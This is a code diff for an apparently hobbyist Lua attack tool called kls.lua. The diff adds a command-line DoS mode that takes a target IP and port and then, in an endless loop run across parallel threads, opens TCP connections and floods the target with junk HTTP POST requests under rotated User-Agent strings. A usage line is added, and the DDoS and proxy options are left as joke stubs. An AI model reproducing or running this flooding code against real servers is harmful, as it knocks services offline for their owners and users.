@@ -10,7 +10,7 @@ local config_content = [[
 
 local m = {}
 
-m.ESC = "Hexadecimal" -- [ note: On different OS have their own ANSI Escape can be change to ]
+m.ESCc = "Hexadecimal" -- [ note: On different OS have their own ANSI Escape can be change to ]
                       -- [ "Octal", "Ctrl-Key", "Unicode", "Hexadecimal", "Decimal"          ]
                       -- ANSI Escape Sequences doc : https://gist.github.com/ConnerWill/d4b6c776b509add763e17f9f113fd25b
                       -- on unix can be check via echo $COLORTERM or just env and scroll
@@ -104,7 +104,6 @@ local branding = [[
 (,/'     \_,(___,/' /'        (___,/   (___,/(__                                                  
 ]]
 
-
 local function warn(text)
     io.write(colord:bit16setcolor("default","default","graphic","bold"))
     io.write(colord:b256setcolor(130,"fg").."Warning : "..colord:reset()..tostring(text))
@@ -140,8 +139,6 @@ if config.useproxies then
         if not proxies or #proxies == 0 then return nil end
         return proxies[math.random(1, #proxies)]
     end
-elseif not config.useproxies then
-    warn("proxies is off")
 end
 
 
@@ -187,6 +184,7 @@ local function tdos()
                     activelanes[i] = lanes.gen("*", function()
                                         local socket = require("socket")
                                         local useragent = require("useragent")
+                                        math.randomseed()
                                         for i = 1, 10 do
                                             local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                                             colord:curtosaveDEC()
@@ -214,6 +212,7 @@ local function tdos()
                 else
                     for i = 1, 10 do
                         local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
+                        math.randomseed()
                         colord:curtosaveDEC()
                         tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
                         tcp:close()
@@ -226,12 +225,90 @@ local function tdos()
     end
 end
 
-local function help()
-    io.write("\n")
-    warn("cli: help")
+local function cdos()
+    local ip = arg[2]
+    local port = arg[3]
+    local count = 1
+    if tostring(ip) == nil then
+        warn("input the url pls")
+        exit()
+    end
+    if tonumber(port) == nil then 
+        if config.tdosportdefault == "https" then
+            port = 443 
+        elseif config.tdosportdefault == "http" then
+            port = 80
+        else
+            warn("invaild in tdosportdefault")
+            exit()
+        end
+    end
+    if config.uselanes then
+        while true do
+            if config.useproxies then
+                print("proxies") --this will remain unfinish
+            else
+                for i = 1, config.MAXTASK do --allocate
+                    activelanes[i] = lanes.gen("*", function()
+                                        local socket = require("socket")
+                                        local useragent = require("useragent")
+                                        math.randomseed()
+                                        for i = 1, 10 do
+                                            local tcp = assert(socket.connect(tostring(ip), tonumber(port)))
+                                            colord:curtosaveDEC()
+                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
+                                            tcp:close()
+                                            colord:curtosaveDEC()
+                                            io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",ip,port,count))
+                                        end
+                                    end)()
+                    count = count + 1
+                end
+                for i = 1, #activelanes do  --free
+                    local sellanes = activelanes[i]
+                    sellanes:cancel()
+                    sellanes:join()
+                    activelanes[i] = nil
+                end
+                collectgarbage("collect")
+            end
+        end
+        else
+            while true do
+                if config.useproxies then
+                    print("proxies") -- this will remain unfinish bc it's similar to ddos
+                else
+                    for i = 1, 10 do
+                        local tcp = assert(socket.connect(tostring(ip), tonumber(port)))
+                        math.randomseed()
+                        colord:curtosaveDEC()
+                        tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(ip), tonumber(port)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
+                        tcp:close()
+                        colord:curtosaveDEC()
+                        io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",ip,port,count))
+                    end
+                    count = count + 1
+                end
+            end
+    end
 end
 
 local function tddos() --lol
+    prettytext:wait(1)
+    io.write("calling my friends\n")
+    prettytext:wait(1)
+    warn("not found\n")
+    prettytext:wait(1)
+    io.write("calling my pawns\n")
+    prettytext:wait(1)
+    warn("calling 67 billion peoples\n")
+    prettytext:wait(1)
+    warn("welcome back master manipulator\n")
+    prettytext:wait(1)
+    exit()
+end
+
+local function cddos() --lol
     prettytext:wait(1)
     io.write("calling my friends\n")
     prettytext:wait(1)
@@ -250,7 +327,7 @@ end
 
 local tchoice = {
     dos = "DoS attack the request url",
-    ddos = "DDoS attack unfinish"
+    ddos = "DDoS attack unfinish and will remain unfinish"
 } -- this only show des
 
 local justrun = {
@@ -265,13 +342,34 @@ local justrun = {
 -- ======================================================================
 
 local cchoice = {
-    dos = "lol",
+    dos = "dos attack usage: lua ./kls.lua dos [TARGET] [PORT]",
     ddos = "lol"
+}
+
+local function help()
+    io.write("\n")
+    for i, v in pairs(cchoice) do
+        io.write(string.format("%s  %s\n",i,v))
+    end
+end
+
+local cjustrun = {
+    dos = {
+        run = function() cdos() end
+    },
+    ddos = {
+        run = function() cddos() end
+    },
+    help = {
+        run = function() help() end
+    }
 }
 
 local function cli(argv)
     if not cchoice[tostring(argv)] then
         help()
+    else
+        cjustrun[tostring(argv)].run()
     end
 end
 
@@ -316,7 +414,7 @@ local function main()
     elseif arg[1] then
         cli(tostring(arg[1]))
     else
-        warn("invalid mode")
+        warn("invalid mode") --why this here?
         exit()
     end
     return 0
